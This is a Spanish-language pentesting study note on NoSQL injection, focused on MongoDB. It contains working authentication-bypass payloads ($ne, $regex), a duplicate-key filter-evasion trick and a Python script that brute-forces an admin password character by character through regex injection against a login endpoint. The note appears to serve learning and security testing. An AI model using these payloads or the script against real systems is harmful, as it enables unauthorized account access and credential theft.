
---
Tags: #web #form #formularios #noRelacional #mongodb #nosqli 

---
## 🧾 Definición

> [[NoSQLI]]njection es una vulnerabilidad que permite a un atacante inyectar código malicioso en consultas de bases de datos **NoSQL** (como MongoDB, CouchDB o Firebase) al manipular los datos enviados al servidor.

En lugar de usar SQL, se aprovechan estructuras como **JSON** para alterar la lógica de consultas.

---
## 📚 Bases de datos vulnerables

- **MongoDB**
- **CouchDB**
- **Firebase**
- **ElasticSearch**
- **Redis** (algunas configuraciones)
- **Cassandra**

---
## 🎯 Objetivos del atacante

- Autenticación Bypass
    
- Exfiltración de datos
    
- Acceso no autorizado a cuentas de usuarios
    
- Enumeración de usuarios o contraseñas
    

---
## 🧪 Metodología de ataque

### 🔧 1. Operator Injection

|Operador|Descripción|Ejemplo de uso|
|---|---|---|
|`$ne`|No igual|`"username": {"$ne": null}`|
|`$gt`|Mayor que|`"login": {"$gt": ""}`|
|`$lt`|Menor que|`"login": {"$lt": "zzz"}`|
|`$regex`|Expresión regular|`"pass": {"$regex": "^adm"}`|
|`$in`|En lista de valores|`"user": {"$in": [...]}`|
|`$where`|Ejecutar JS (MongoDB <=4)|`"user": {"$where": ...}`|

---
## 🛠 Técnicas comunes de explotación

### 🔓 Autenticación Bypass
```http
POST /login HTTP/1.1 Content-Type: application/x-www-form-urlencoded  username[$ne]=a&password[$ne]=a
```

```json
{   "username": { "$ne": null },   "password": { "$ne": null } }
```

---
### 🧵 Extracción de datos (por caracteres)

#### Extraer longitud

```http
`username[$ne]=a&password[$regex]=.{5}
```
#### Extraer datos paso a paso

`username[$ne]=a&password[$regex]=^p 
`username[$ne]=a&password[$regex]=^pa`
`username[$ne]=a&password[$regex]=^pas ...`
#### JSON

```json
{ "username": { "$eq": "admin" }, "password": { "$regex": "^adm" } }
```

---

### 🔐 Evadir WAF / Filtros

> 🧠 En MongoDB, si hay claves repetidas, se usa la última:

`{"id":"10", "id":"100"}`

Resultado: `"id":"100"`

---
## 🔍 Tipos de NoSQLi

|Tipo|Método|Ejemplo|
|---|---|---|
|POST con JSON|API REST|`Content-Type: application/json`|
|POST urlencoded|Formularios web|`username[$ne]=x&password[$ne]=x`|
|GET|Parámetros en la URL|`?username=admin&password[$regex]=^a`|
|Blind NoSQLi|Tiempo o comparación indirecta|Ataques por fuerza bruta secuencial|

---
## 🧪 Ejemplo: Fuerza bruta con JSON (POST)

```python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n\n")
    sys.exit(0)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

#Variables Globales

login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():

    password = ""

    p1=log.progress("Fuerza bruta")
    p1.status("Iniciando fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Password")

    for position in range (1,25):
        for char in characters:

            post_data = '{"username": "admin", "password": {"$regex": "^%s%s"}}' % (password, char)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += char
                p2.status(password)
                break

if __name__ == '__main__':

    makeNoSQLI()

```

---
## 🧪 Tu script personalizado explicado

`post_data = '{"username": "admin", "password": {"$regex": "^%s%s"}}' % (password, char)`

Esto genera un patrón **regex** que filtra el campo `password` comenzando con los caracteres correctos.

> 💡 La respuesta `"Logged in as user"` indica acierto y permite construir la contraseña carácter a carácter.

---
## 🧰 Herramientas útiles

|Herramienta|Descripción|Link|
|---|---|---|
|**[NoSQLMap](https://github.com/codingo/NoSQLMap)**|Automatiza ataques NoSQLi|`codingo/NoSQLMap`|
|**[digininja/nosqlilab](https://github.com/digininja/nosqlilab)**|Laboratorio práctico de NoSQLi|`digininja/nosqlilab`|
|**Burp NoSQLiScanner**|Extensión de Burp para detectar inyecciones NoSQL|En BApp Store|
|**Postman**|Para construir peticiones con payloads personalizados|GUI muy útil|

---

## 📡 MongoDB como ejemplo principal

- MongoDB almacena documentos BSON (JSON binario).
    
- La inyección suele ir dirigida a:
    
    - Operadores como `$regex`, `$ne`, `$gt`
        
    - Claves manipuladas como `"username[$ne]=x"`
        

---

## 🧠 Consejos de explotación

- Usa `$regex` con `^` para inicios de cadena.
    
- Evita caracteres conflictivos con URLencoding si es GET.
    
- En Blind NoSQLi usa respuestas HTTP (200/302) como canal de filtrado.
    
- Usa herramientas como Burp Repeater o Postman para verificar manualmente.

---
# Referencias
- PayAllTheLoads:[Enlace](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- HackTricks:[Enlace](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- Portswigger:[Enlace](https://portswigger.net/web-security/nosql-injection)